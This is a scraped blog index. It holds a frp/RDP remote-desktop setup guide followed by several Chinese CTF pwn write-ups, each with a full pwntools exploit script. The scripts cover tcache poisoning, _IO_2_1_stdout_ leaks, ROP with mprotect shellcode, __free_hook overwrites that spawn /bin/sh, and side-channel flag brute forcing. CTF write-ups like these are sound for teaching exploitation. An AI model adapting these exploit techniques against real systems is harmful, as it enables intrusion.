rdp","date":"2022-01-17","objectID":"/zh-cn/2022-01-17-frp-%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86rdp%E5%8D%8F%E8%AE%AE/","tags":["frp","rdp"],"title":"frp + rdp 实现跨局域网远程桌面控制","uri":"/zh-cn/2022-01-17-frp-%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86rdp%E5%8D%8F%E8%AE%AE/"},{"categories":["tools"],"content":" 利用frp工具和rdp协议，借助公网IP自己搭建一个远程桌面服务，用于代替向日葵和teamview等软件。 前言\r严格来说，本篇博客不算是教程，只是之前折腾frp这款工具的一个记录，即如何利用frp这款强大的代理软件和一个公网服务器实现内网rdp协议穿透，进而可以远程访问在内网中的Windows主机。Windows自带的远程桌面比其他远程软件如Teamview、花生壳等体验都要好很多，在拥有大带宽的网络环境时，可以做到延时低，操作流畅。 自己有个笔记本，家里放了一个台式，有时候带笔记本外出的时候有访问台式机的需求。刚开始自己也是用一些免费的远程控制软件，但是用到后期基本需要付费。前段时间趁着阿里云打折(一直在打折)的时候买了一个ECS云服务器，于是万事俱备，只需要借助frp手动搭建一下服务即可。 本篇教程的前提： 拥有一个公网IP服务器，最好是静态IP 系统至少需要为Windows专业版，或者想办法开启了远程桌面服务 本教程要做的事情： 有一个电脑A，处于内网；有另一个电脑B，也处于内网；A和B均可以访问外网；有一台公网服务器C。 在C上部署frp服务端 在A和B上部署frp客户端 最后实现A远程桌面访问B或者B远程访问A Frp和rdp\r这里的介绍不会太多，只是简单提一下。 关于frp详细的介绍可以参考官网，实在搞不懂的地方也可以翻翻源码。这款软件简洁而强大，封装性很好，使用起来非常方便。这类代理软件都是一种类似中介的角色，可以转发流量，并且在转发的过程中添加一些鉴权、认证等工作，frp支持的协议（模式）很多，有tcp/udp/http，还支持tls加密，点对点穿透等。需要注意的是，使用软件过程中一定注意不要违法！尤其需要注意，通过IP地址对外提供网站服务是需要备案的！ rdp是远程桌面协议，用于远程桌面接入，关于协议的详情可以自行搜索，这里主要关注其在windows上的监听的端口号为3389。 搭建过程\r云服务器\r主要涉及到云服务器的购买，ssh设置等。 可以上阿里云、腾讯云等购买一台云服务器，使用固定IP，资金充足的情况下，带宽越大越好。我买的是阿里云，相对来收较为便宜~ 获取到ECS实例后，首先使用root登录到服务器上，修改好密码，创建一个普通用户，配置好sudo之类的。最后，修改sshd的配置文件，主要修改项为： 禁止root登录 禁止密码登录 使用公私钥认证 上传自己的公钥到服务器 到云服务器控制台开启相关端口。阿里云的控制台是： 如需要开启frps运行的绑定端口、看板端口、公网服务器暴露出去的remote port等。 服务端\r到frp的官网上下载最新的release包，选择符合当前公网服务器架构的二进制包。我采用的是stcp模式，这样可以避免在服务器上暴露端口，修改frps.ini，配置如下： [common] bind_port = 7000 authentication_method = token token = auth_token # 修改为自己的token dashboard_port = 7500 dashboard_user = admin # 最好不要用这样的用户名和密码 dashboard_pwd = admin123 客户端(被远程访问)\r同样需要下载frp二进制包，修改frpc.ini，配置如下： [common] server_addr = server_ip server_port = 7000 token = auth_token # 与服务器的token保持一致 [rdp_server] type = stcp use_encryption = true use_compression = true sk = secret_key # 修改为自己的sercet key local_ip = 127.0.0.1 local_port = 3389 客户端(远程访问)\r修改fprc.ini，配置如下： [common] server_addr = server_ip server_port = 7000 token = auth_token # 与服务器的token保持一致 [rdp_client] type = stcp role = visitor use_encryption = true use_compression = true sk = secret_key # 修改为自己的sercet key server_name = rdp_server local_ip = 127.0.0.1 bind_port = 7001 最后使用Remote Desktop访问127.0.0.1：7001地址，然后填好账户名，输入密码后即可远程访问内网的主机。 注册为服务\r如果要用systemctl管理frp服务端的话，需要建立文件/usr/lib/systemd/system/frp.service，然后添加服务： [Unit] Description=frp server After=network.target remote-fs.target nss-lookup.target [Service] Type=simple ExecStart=/usr/local/bin/frps -c /usr/local/bin/frps.ini KillSignal=SIGQUIT TimeoutStopSec=5 KillMode=process PrivateTmp=true StandardOutput=syslog StandardError=inherit [Install] WantedBy=multi-user.target 然后执行：systemctl daemon-reload重启即可。重启后，可以用systemctl start/restart/stop/enable等来管理服务。 如果想要要在Windows上开机自启动的话，可以使用winsw或者nssm，将frp注册为服务，然后就会开机自启动了。 以winsw为例，下载了二进制包后，编写frp_rdp.xml： \u003cservice\u003e \u003cid\u003efrp\u003c/id\u003e \u003cname\u003efrp_0.38.0_windows_amd64\u003c/name\u003e \u003cdescription\u003efrpc client, this computer will be visited by rdp\u003c/description\u003e \u003cexecutable\u003eE:\\frp_0.38.0_windows_amd64\\frpc.exe\u003c/executable\u003e \u003carguments\u003e-c E:\\frp_0.38.0_windows_amd64\\frpc.ini\u003c/arguments\u003e \u003confailure action=\"restart\" delay=\"60 sec\"/\u003e \u003confailure action=\"restart\" delay=\"120 sec\"/\u003e \u003clogmode\u003eappend\u003c/logmode\u003e \u003clogpath\u003elogs\u003c/logpath\u003e \u003c/service\u003e 然后执行： winsw.exe install frp_rdp.xml winsw.exe start frp_rdp.xml 总结\r只要搭建过一次内网穿透的服务，其他协议如ssh/http/ftp等的搭建都大同小异。为了安全起见，建议： 除了frps的绑定端口，尽量不要在公网服务器上暴露端口，小心被扫 尽量使用认证、鉴权，开启TLS等机制保障通信安全 关注frp的最新发布包并及时更新，毕竟万一frp爆出个漏洞，内网的主机是存在很大风险的 相关链接\rfrp winsw nssm frp搭建教程 ","date":"2022-01-17","objectID":"/zh-cn/2022-01-17-frp-%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86rdp%E5%8D%8F%E8%AE%AE/:0:0","tags":["frp","rdp"],"title":"frp + rdp 实现跨局域网远程桌面控制","uri":"/zh-cn/2022-01-17-frp-%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86rdp%E5%8D%8F%E8%AE%AE/"},{"categories":["pwn-wp"],"content":"总结\r主要是针对realloc的利用，分析了一波源码，当调用realloc(ptr, new_size)时，利用点如下： 若ptr为NULL，则return malloc(new_size) 若ptr != NULL \u0026\u0026 new_size == 0，则调用free(ptr);return NULL 若new_size非法时，则return NULL 若new_size \u003c old_size - 0x20，则会chunk shrink 若new_size \u003e old_size，高地址处的chunk为top则直接扩展；为可free状态的chunk，则先unlink，再判断要不要切割；否则直接申请新的内存，拷贝后释放老的 漏洞点\rcall_free函数可以double free： call_realloc可以利用realloc函数的缺陷进行利用： 利用思路\r由于题目是libc-2.27.so，那么可以利用tcache poisoning，修改next指针，进行任意地址分配内存。题目中没有泄露内容的分支，因此需要劫持IO_2_1_stdout_先泄露地址，再劫持hook即可完成利用。 思路如下： 利用realloc分配0xc0的chunk A，而后shrink到0x90 利用double free释放8次chunk A，这个时候在chunk A的fd留下了libc地址 利用realloc分配小chunk切割unsorted bin chunk，并且低2字节修改fd，使其指向stdout 利用realloc(-1)将ptr_r置为0 利用tcache poisoning分配到stdout结构体泄露地址；用同样的方法修改__free_hook为system函数地址 Exp\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- # author: lynne from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] def ma(size, data=\"d\"): io.sendlineafter(\"Your choice: \", \"1\") io.sendlineafter(\"Size: \", str(size)) if size \u003e 0: io.sendafter(\"Data: \", data) def ca(size, data=\"d\"): io.sendlineafter(\"Your choice: \", \"2\") io.sendlineafter(\"Size: \", str(size)) if size \u003e 0: io.sendafter(\"Data: \", data) def rea(size, data=\"d\"): io.sendlineafter(\"Your choice: \", \"3\") io.sendlineafter(\"Size: \", str(size)) if size \u003e 0: io.sendafter(\"Data: \", data) def __dele(c): io.sendlineafter(\"Your choice: \", \"4\") io.sendlineafter(\"Which: \", c) def dele_m(): __dele('m') def dele_c(): __dele('c') def dele_r(): __dele('r') \"\"\" 1. attack stdout to leak addr 2. attack hook \"\"\" rea(0xb0) rea(0x80) for i in range(0x7): dele_r() rea(0) # clear if gift.debug: libc_base = get_current_libcbase_addr() pl = p16_ex(libc_base + libc.sym['_IO_2_1_stdout_']) else: pl = p16_ex(0xc760) rea(0x10, pl) rea(-1) rea(0x80) ma(0x80, flat(0xfbad1887, 0, 0, 0, \"\\x00\")) libc_base = recv_libc_addr(io) - 0x3ed8b0 log_libc_base_addr(libc_base) libc.address = libc_base dele_r() rea(0) rea(0x10, flat(libc.sym['__free_hook'] - 8)) rea(-1) rea(0x10) rea(-1) rea(0x10, flat(\"/bin/sh\\x00\", libc.sym.system)) dele_r() get_flag_when_get_shell(io) io.interactive() 最后加个爆破脚本： #!/bin/sh for i in $(seq 1 10) do ./exp.py re ./TWCTF_online_2019_asterisk_alloc -p 28619 --no-log done 1/16的概率，远程打： 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-12-27","objectID":"/zh-cn/2021-12-27-twctf-online-2019-asterisk-alloc/:0:0","tags":["pwn"],"title":"TWCTF_online_2019_asterisk_alloc","uri":"/zh-cn/2021-12-27-twctf-online-2019-asterisk-alloc/"},{"categories":["pwn-wp"],"content":"总结\r刚开始以为是虚拟机的题，后来发现有点像状态机。函数之间互相嵌套，看着看着差点把自己给绕进去了……不过这道题其实就是披着逆向的栈溢出的题，只不过需要用scanf绕过canary。做完本题后，总结如下： scanf绕过canary，这个算是基础考点，如果是%d，可以用-号绕过，如果是%u，可以用+等特殊字符绕过，这样就不会覆盖待写入地址的原有内容。 高版本的IDA有一个快捷键%，可以进行花括号跳转，这样就不会看错位了；另外IDA 7.0有一个hexlight插件，可以高亮显示括号，可以从这里下载。 可根据unsorted bin的fd或bk指针残留的地址猜测libc的版本。附件没有给libc，我是根据这个地址猜出来libc版本是2.31，后来验证了一下，的确是libc-2.31.so BuildID[sha1]=099b9225bcb0d019d9d60884be583eb31bb5f44e。 snprintf的返回值是待写入的字符串的长度，而不是指定的那个size的值。例如snprintf(dest, 4, \"%s\", \"123456789\");的返回值是strlen(\"123456789\")，是9而不是4。 做题时眼神要好，刚开始看错位了一个大括号，一度怀疑题目是不是出错了…… 题目分析\rChecksec\r函数分析\r很多函数中加了很多地址无关代码和数据，做题的时候忽视这些变量即可，和主流程没有任何关系，不过刚开始肯定是要踩坑的，以为这些变量很重要…… Main\r有些函数我已重命名，接下来会一个一个分析 Sub_14D7\r初始化函数，只需要看框出来的地方即可。一顿操作后，得到了一个0x500大小的unsorted bin chunk。 Sub_12CD\r这个地方函数识别有问题，可以在这个0x12cd地址，先按下u键undefine，再按下c转为汇编代码，再按p提取函数，发现其实就是设置沙盒。检测一波： Sub_19D6\r流程为： 读取用户输入的大小，调用malloc 分配堆内存，然后读取用户输入 读取用户输入的16个整数，存储在0x66E0处的数组。这里我直接把数组的元素依次命名为a0, a1, ...a15。 Sub_2F1D\r开始处理的入口函数，也就是从这里开始，函数有点绕了。这里我用python的缩进来分析各个分支。 提取主要流程如下： sub_2F1D: a0 \u003c a15: a1 \u003c a13: a2 \u003e a10: a3 != a11: a4 \u003c a12 and a5 \u003c a14 and a6 + a7 \u003e a8 + a9: read_input(ptr, size) show_ptr() return sub_2907() sub_2514() sub_20F7() 后续的函数都可以这么分析，这样整理后流程看起来就清晰多了。这里可以发现，在show_ptr后有个return，由于程序使用的是malloc，且read_input函数里面也没有\\x00截断，因此此处可以泄露出main_arena+XX的地址。 接下来直接给出其他函数的主要流程。 Sub_1ED8(show_ptr)\rsub_1ED8(show_ptr): a4 \u003e a12: a5 \u003c a14: a6 + a7 == a8 + a9: puts(ptr) Sub_2907\rsub_2907: a1 \u003c a13: a2 \u003e a10: read(0, buf1, 0x50) buf1: 0x60C0 a3 == a11: a4 \u003e a12: a5 \u003c a14 and a6 + a7 \u003e a8 + a9: snprintf(buf2, 0xAuLL, \"%s\", buf1) buf2: 0x63E0 return sub_2CFB() show_ptr() return sub_2907() sub_2514() Sub_2CFB\rsub_2CFB: read(0, buf1, 0x500) res = snprintf(buf2, 0xAuLL, \"%s\", buf1) for i in range(res): scanf(%d, \u0026stack_var) puts(buf1) Sub_2514\rsub_2514: a1 \u003e a13: a2 \u003e a10: read(0, buf1, 0x20) a3 != a11: a5 \u003c a14 and a6 + a7 \u003e a8 + a9: for _ in range(stack_var1): scanf(\"%d\", \u0026stack_var2) return sub_2514() show_ptr() sub_2CFB() sub_2907() Sub_2F07\rsub_20F7: a1 \u003e a13: a2 \u003e a10: read(0, buf1, 0x200) a3 != a11: a4 \u003e a12: a5 \u003c a14 and a6 + a7 \u003e a8 + a9: res = snprintf(buf2, 0xAuLL, \"%s\", buf1) for _ in range(res): scanf(\"%d\", \u0026stack_var) return sub_2CFB() show_ptr() sub_2907() sub_2514() 漏洞点\r目前发现的漏洞点有： sub_2F1D的那个return分支可以往ptr写内容，同时可以泄露libc地址 sub_2CFB，可以溢出写buf1覆盖ptr sub_2514，for循环的边界是一个未初始化的变量： sub_2F07，漏洞就在于snprintf，最大的返回值可以是0x200，之后存在栈溢出，因为4 * 0x200 \u003e 0x110。 利用思路\r分析完主要函数的流程后，利用思路很清晰，主要分两步： 利用malloc残留的指针泄露的地址，为了避免出现套娃情况，这里直接使用sub_2F1D函数打印信息后返回的那个分支 利用sub_2F07中的栈溢出进行ROP，我这里使用mprotect+shellcode读取flag EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- from pwncli import * cli_script() io: tube = gift['io'] elf: ELF = gift['elf'] libc: ELF = gift['libc'] def assign_val(chunk_size, data, arrays): io.sendafter(\"hhh\\n\", \"1\".ljust(4, \"\\x00\")) io.sendlineafter(\"size???\\n\", str(chunk_size)) io.sendline(data) io.recvline(\"Lucky Numbers\\n\") for i in arrays: io.sendline(str(i)) def get_array(*indexs): arr = [0] * 16 for i in indexs: arr[i] = 3 return arr def leak_addr(): arr = get_array(15, 13, 2, 3, 4, 14) assign_val(0x500, \"a\"*8, arr) io.sendafter(\"hhh\\n\", \"2\".ljust(4, \"\\x00\")) libc_base = recv_libc_addr(io, offset=0x1ebbe0) log_libc_base_addr(libc_base) libc.address = libc_base def rop_attack(): arr = get_array(15, 1, 2, 3, 4, 14, 6) assign_val(0x10, \"deadbeef\", arr) io.sendafter(\"hhh\\n\", \"2\".ljust(4, \"\\x00\")) io.sendafter(\"xmki\\n\", cyclic(0x200, n=8)) for _ in range(0x42): io.sendline(str(0x61616161)) io.sendline(\"-\") io.sendline(\"-\") io.sendline(str(0x61616161)) io.sendline(str(0x61616161)) rop = ROP(libc) target_addr = libc.sym['__free_hook'] \u0026 ~0xfff rop.mprotect(target_addr, 0x1000, 7) rop.read(0, target_addr, 0x600) rop.call(target_addr) print(rop.dump()) payload = rop.chain() for i in range(0, len(payload), 4): num = u32(payload[i:i+4]) io.sendline(str(num)) for _ in range(0x200-0x42-4-(len(payload) // 4)): io.sendline(str(0x61616161)) sleep(1) io.sendline(b\"\\x90\"*0x100 + asm(shellcraft.cat(\"/flag\"))) flag = io.recvregex(\"flag{.*}\") if flag: suc","date":"2021-12-22","objectID":"/zh-cn/2021-12-22-pwnhub-12%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9Bpwn-note9-wp/:0:0","tags":["pwn"],"title":"pwnhub-12月内部赛pwn-note9-wp","uri":"/zh-cn/2021-12-22-pwnhub-12%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9Bpwn-note9-wp/"},{"categories":["pwn-wp"],"content":"总结\r侧信道攻击，爆破出flag。这里对shellcode的长度有限制，所以需要尽量写较短的shellcode完成利用。 题目分析\rChecksec\r同时发现有沙盒，读取输入后，只能使用alarm系统调用： 函数分析\rInit\r在_init段注册了一个函数： 主要流程为： mmap一块内存，起始地址为0xcafe000，页权限为可读可写可执行 读取flag到0xcafe000 从/dev/urandom读取8个字节，存储在一个整数变量中 按每8个字节与flag进行异或 Main\r主要就是读取用户输入，然后执行shellcode。在0x202020处拷贝了shellcode，如下： 利用思路\r使用alarm调用取消定时 利用flag的特征求解出异或的key。flag为uuid字符串时，长度为42，且有些字符是已知的，包括flag{}-。 利用测信道攻击，爆破出flag。思路为：逐个字节比较，如果猜测成功，那么将程序陷入死循环，否则程序会异常终止。 猜到所有的flag EXP\r考虑到flag的特征，其实这里可以只把猜测的范围限制为0123456789abcdef，加快爆破的速度。这份exp将范围扩大了一些（偷懒）。 #!/usr/bin/python3 # -*- encoding: utf-8 -*- from pwncli import * cli_script() debug = gift.debug filename = gift.filename if not debug: ip = gift.ip port = gift.port # flag{2bb747aa-dabb-4826-a4d7-9fcb98b949f8} shellcode = \"\"\" /* alarm(0) */ mov al, 0x25 syscall /* recover key */ mov ebp, 0xcafe000 mov eax, dword ptr [rbp] xor eax, 0x67616c66 mov ebx, dword ptr [rbp+0x28+4] shl rbx, 32 or rbx, rax /* recover flag */ L1: xor qword ptr [rbp + 8 * rdx], rbx inc edx cmp dl, 6 jnz L1 L2: cmp byte ptr [rbp + {}], {} jz L2 /* stuck */ \"\"\" idx = 0 flag = \"\" for _ in range(42): err = True for i in bytearray(b\"-{{}}flagbcde0123456789\"): if debug: io = process(filename) else: io = remote(ip, port) io.send(asm(shellcode.format(idx, hex(i)))) if io.can_recv_raw(3): io.close() continue else: flag += chr(i) print(f\"Now flag is : {flag}\") io.close() err = False break if err: error(\"This round is wrong!\") idx += 1 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-12-11","objectID":"/zh-cn/2021-12-11-isitdtu2019-babyshellcode/:0:0","tags":["pwn"],"title":"isitdtu2019_babyshellcode","uri":"/zh-cn/2021-12-11-isitdtu2019-babyshellcode/"},{"categories":["pwn-wp"],"content":"总结\r又是一道虚拟机的题，记录一下分析过程。虚拟机的题一般来说exp不会很复杂，但是分析起来需要时间。 题目分析\rChecksec\r主题到该文件是静态编译的，并且去除了符号。首先需要恢复一些符号，静态编译去符号文件的恢复可以参考这篇博客。根据教程一步步恢复即可，实在恢复不了的呢，可以用strace或者gdb之类的工具动态调试一下，然后大概猜一下函数的功能。毕竟常用的函数就那么几个。 函数分析\r首先恢复一下结构体： struct Block{ int *stack_ptr; int size; int sp; }; Main\rDo_malloc\r就是在分配结构体，然后分配内存，刷新size和sp Copy_value\r拷贝输入到前面分配的两个block中 Do_vm\r这里的流程比较多，逐个分析，首先将前面分配的两个block以此命名为：use_block和opcode_block，还有一个临时变量，命名为tmp_block。 主要的流程如下： 首先从opcode_block的stack中pop出一个值，赋值给opcode，判断是否进入下面的分支： 当opcode为： 0x10101010： v1 = tmp_block.pop() v2 = tmp_block.pop() tmp_block-\u003estack_ptr[tmp_block-\u003esp+v1] = v2 // 这里存在溢出写 0xFFFF28： v = tmp_block.pop() use_block.push(v) 0xABCEF: v1 = tmp_block.pop() v2 = tmp_block.pop() tmp_block.push(v1 * v2) 0x11111: v1 = tmp_block.pop() v2 = tmp_block.pop() tmp_block.push(v1 - v2) 0x2A3D: v = use_block.pop() tmp_block.push(v) 0x514: v1 = tmp_block.pop() v2 = tmp_block.pop() tmp_block.push(v1 / v2) -1: v = tmp_block.pop() v1 = tmp_block-\u003estack_ptr[tmp_block-\u003esp + v] tmp_block.push(v1) // 这里存在溢出读 0: v1 = tmp_block.pop() v2 = tmp_block.pop() tmp_block.push(v1 + v2) 执行完成后，释放tmp_block 利用思路\r将虚拟机的执行流程分析完后，利用思路有很多，我的思路为： 调试可知，tmp_block的stack_ptr地址要低于tmp_block的地址。利用0x10101010的溢出，将tmp_block-\u003estack_ptr修改为__free_hook-0x8 利用use2tmp，将__free_hook-0x8的内容填充为/bin/sh\\x00\\x00\\x00+p64(system) 最后释放tmp_block的是时候，会执行system(\"\"/bin/sh\") 在静态编译的ELF文件中寻找system函数有个小技巧，寻找exit 0字符串： 即可找到system地址如下： EXP\r#!/usr/bin/python3 # -*- encoding: utf-8 -*- from pwncli import * cli_script() io: tube = gift['io'] free_hook_addr = 0x80e09f0 system_addr = 0x8051c60 def get_payload(int_list): res = \"\" for i in int_list: res += str(i) + \" \" res = res.rstrip() info(f\"Get payload: {res}\") return res opcodes = [0x2a3d, 0x2a3d, 0x10101010, 0x2a3d, 0x2a3d, 0x2a3d] uses = [free_hook_addr - 8, 0x45, 0x6e69622f, 0x68732f, system_addr] io.sendline(get_payload(opcodes)) sleep(1) io.sendline(get_payload(uses)) sleep(1) io.sendline(\"cat /flag\") io.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-12-11","objectID":"/zh-cn/2021-12-11-roarctf-2019-ez-op/:0:0","tags":["pwn"],"title":"roarctf_2019_ez_op","uri":"/zh-cn/2021-12-11-roarctf-2019-ez-op/"},{"categories":["pwn-wp"],"content":"陇原战疫2021网络安全大赛-Pwn-Wp\r今天正好有事情跟比赛冲突了，回到家已经八点多，花了一个小时左右做了三道pwn题，都是常规题。第四题忙活了半天没啥进展，想想还是先把前三题的wp写了。这里总结下每道题的解题思路： bbbaby：题如其名 首先修改__stack_chk_fail@got为puts@plt，只要能继续往后执行main函数就行 利用main函数栈帧的溢出泄露出libc地址 修改atoi@got为system，执行下get_int，输入/bin/sh即可获得shell Magic：这题甚至都不需要给libc。题目加了很多无用的分支代码，需要花点时间分析下，其实题目很简单。 有个空闲的0x230，应该是fopen分配出来的IO_FILE结构体。刚好能分配5个0x70。同时伪造一个0x70的fastbin chunk的头。 利用edit部分写修改fd为伪造的chunk 分配到fake chunk 利用edit泄露出flag h3apclass：libc-2.31下的off by one与setcontext+61利用 堆风水，获得一个unsorted bin chunk并制造overlapped chunk 爆破4bit，概率为1/16。利用tcache bin分配到_IO_2_1_stdout_结构体上面，泄露libc地址 同样的方式泄露heap地址。也可以直接用__free_hook附近的区域打，这样就不需要泄露堆地址 利用tcache bin attack修改__free_hook为mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20] 最后用setcontext+61执行mprotect，然后跳转执行cat('/flag')的shellcode读取到flag Bbbaby\rChecksec\r漏洞点\r任意地址写： main函数的栈溢出： 由于有canary，所以需要改掉__stack_chk_fail@got的内容 Exp\r#!/usr/bin/python3 from pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = gift['libc'] if gift['remote']: libc = ELF(\"./libc-2.23.so\") def write_any(addr, content): p.sendlineafter(\"your choice\\n\", \"0\") p.sendlineafter(\"address:\\n\", str(addr)) p.sendafter(\"content:\\n\", content) def stack_overflow(data): p.sendlineafter(\"your choice\\n\", \"1\") p.sendlineafter(\"size:\\n\", str(0x1000)) p.sendafter(\"content:\\n\", data) # change stack_chk write_any(0x601020, p64(elf.plt.puts)) payload = flat({ 0x118:[ 0x0000000000400a03, elf.got.puts, elf.plt.puts, 0x40086c, 0x4007c7 ] }) stack_overflow(payload) p.sendlineafter(\"your choice\\n\", \"2\") libc_base = recv_libc_addr(p, offset=libc.sym.puts) log_libc_base_addr(libc_base) libc.address = libc_base p.sendlineafter(\"address:\\n\", str(elf.got.atoi)) p.sendafter(\"content:\\n\", p64(libc.sym.system)) p.sendline(\"/bin/sh\\x00\") get_flag_when_get_shell(p) p.interactive() 远程打： Magic\rChecksec\r给的libc版本为2.23 漏洞点\rUAF两处： Exp\r#!/usr/bin/python3 from pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = gift['libc'] def add(idx): p.sendlineafter(\"Input your choice: \\n\", \"1\\n\\n\") p.sendlineafter(\"Input the idx\\n\", str(idx)+\"\\n\\n\") p.recvuntil(\"Search finished\\n\") def edit(idx, data): p.sendlineafter(\"Input your choice: \\n\", \"2\\n\\n\") p.sendlineafter(\"Input the idx\\n\", str(idx)+\"\\n\\n\") p.sendafter(\"Input the Magic\\n\", data) p.recvuntil(\"Magic\u003e \") m = p.recvuntil(\" \u003cMagic\") info(f\"Get msg: {m}\") return m def dele(idx): p.sendlineafter(\"Input your choice: \\n\", \"3\\n\\n\") p.sendlineafter(\"Input the idx\\n\", str(idx)+\"\\n\\n\") p.recvuntil(\"remove the Magic\\n\") # alloc add(0) add(0) add(0) add(0) add(1) # prepare for a fake 0x70 chunk edit(1, flat([0, 0, 0, 0x71])) dele(1) dele(0) # partial overwrite edit(0, \"\\xe0\") add(0) add(0) # leak flag edit(0, \"a\"*0x50) p.interactive() 远程打： H3apclass\rChecksec\r保护全开，然后google了一下，libc版本为2.31-0ubuntu9.2_amd64。 漏洞点\rExp\r#!/usr/bin/python3 from pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = gift['libc'] context.update(timeout=3) def add(idx, size, data=\"deadbeef\"): p.sendlineafter(\"4:Drop homework\\n\", \"1\") p.sendlineafter(\"Which homework?\\n\", str(idx)) p.sendlineafter(\"size:\\n\", str(size)) p.sendafter(\"content:\\n\", data) def edit(idx, data): p.sendlineafter(\"4:Drop homework\\n\", \"3\") p.sendlineafter(\"Which homework?\\n\", str(idx)) p.sendafter(\"content:\\n\", data) def dele(idx): p.sendlineafter(\"4:Drop homework\\n\", \"4\") p.sendlineafter(\"Which homework?\\n\", str(idx)) cat_flag = asm(shellcraft.amd64.linux.cat(\"/flag\")) # forge 0x500 chunk add(0, 0x18, 0x18*\"a\") add(1, 0xf8) add(2, 0xf8) add(3, 0xf8) add(4, 0xf8) add(5, 0xf8) add(6, 0x18) # free space dele(6) dele(5) dele(4) dele(3) dele(2) # chaneg size edit(0, 0x18*\"a\" + \"\\x01\\x05\") dele(1) # consume 0x100 add(1, 0x70) add(2, 0x70) log_ex(f\"Now try to attack stdout...\") if gift['debug']: payload = p16_ex(get_current_libcbase_addr() + libc.sym['_IO_2_1_stdout_']) else: payload = p16_ex(0x86a0) add(3, 0x70, payload) # free space dele(1) dele(2) add(1, 0xf8) # leak libc addr add(2, ","date":"2021-11-07","objectID":"/zh-cn/2021-11-07-%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-pwn-wp/:0:0","tags":["pwn"],"title":"陇原战疫2021网络安全大赛-pwn-wp","uri":"/zh-cn/2021-11-07-%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-pwn-wp/"},{"categories":["pwn-wp"],"content":"总结\r可以输入shellcode，但是又不能使用任何系统调用。因此，可以使用侧信道攻击，通过一些现象、反馈等猜测出flag。侧信道常用的反馈有错误、死循环、异常分支等。这里采用死循环，步骤为： 编写shellcode猜测flag的每一位，如果比较正确则死循环 使用tube.can_recv()进行判断，如果陷入死循环，说明当前字符猜测成功 buuctf上的flag都是uuid字符串，因此猜测的字符的范围限于0123456789abcdef-。 EXP\rfrom pwn import * context.arch=\"amd64\" context.os='linux' context.endian=\"little\" context.log_level=\"error\" shellcode = \"\"\" add al, 2 sal rax, 32 mov bl, byte ptr [rax+{}] cmp bl, {} jz $-0x3 \"\"\" possible_char=\"0123456789abcdef-}\" pi = [ord(x) for x in possible_char] flag = 'flag{' idx = 5 n = 32 ip = 'node4.buuoj.cn' port = 28277 print(\"ip: {}, port: {}\".format(ip, port)) while 1: bb = True for x in pi: # p = process(\"./xman_2019_nooocall\") p = remote(ip, port) p.sendafter(\"Your Shellcode \u003e\u003e\", asm(shellcode.format(idx, x))) bb = p.can_recv(timeout=3) p.close() if not bb: flag += chr(x) print(f\"current flag: {flag}\") break if flag.endswith(\"}\"): break if bb: print(\"something wrong...\") continue idx += 1 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-10-29","objectID":"/zh-cn/2021-10-29-xman-2019-nooocall/:0:0","tags":["pwn"],"title":"xman_2019_nooocall","uri":"/zh-cn/2021-10-29-xman-2019-nooocall/"},{"categories":["pwn-wp"],"content":"总结\r题目没有提供free，基本能算是house of force+house of orange，但又不完全是。应该说主要还是围绕着top chunk进行利用，详细利用过程如下： 利用strlen的漏洞，溢出修改top chunk的size，需要滿足要求通过检查，之后会把top chunk释放到unsorted bin中。比如控制剩下的top chunk的size为0x1520，然后溢出修改为0x520 申请一个大的chunk，把old top chunk释放到unsorted bin中 修改unsorted bin chunk的size为更大的值，比如修改为0x2000 然后申请0x2000-0x10用户大小，就会把伪造的unsorted bin chunk返回给用户，这个chunk可以修改到新的top chunk的size 本来这里想直接用house of force，因为可以泄露出heap的地址。但是由于在read_int中有校验，输入不能为负数，所以就不能使用。因此，这里继续上述步骤造出一个新的unsorted bin chunk。 接下来利用edit来溢出修改新的unsorted bin chunk的bk，使得chunklist[0]被写为main_arena+96。这个地址存储着top chunk的指针。 利用edit(0)编辑top chunk的指针，指向bss段，这里注意一下，还要修复unsorted bin链表 直接分配到chunklist，利用edit将atol@got的内容写为system即可 Checksec\r环境为libc-2.27 漏洞点\r在edit分支中，修改完后chunksize的更新使用的是strlen，存在溢出修改chunk size的机会： EXP\r打远程的时候，发送超过0x1000个字符就挂了，不知道为啥。 #!/usr/bin/python3 from pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = gift['libc'] def read_name(name): p.sendafter(\"name :\", name) def add(size, data=\"deadbeef\"): p.sendlineafter(\"Your choice :\", \"1\") p.sendlineafter(\"Size of page :\", str(size)) p.sendafter(\"Content :\", data) def show(idx): p.sendlineafter(\"Your choice :\", \"2\") p.sendlineafter(\"Index of page :\", str(idx)) p.recvline_contains(\"Content :\") m = p.recvline(0) info(f\"Get info: {m}\") return m def edit(idx, data): p.sendlineafter(\"Your choice :\", \"3\") p.sendlineafter(\"Index of page :\", str(idx)) p.sendafter(\"Content:\", data) def 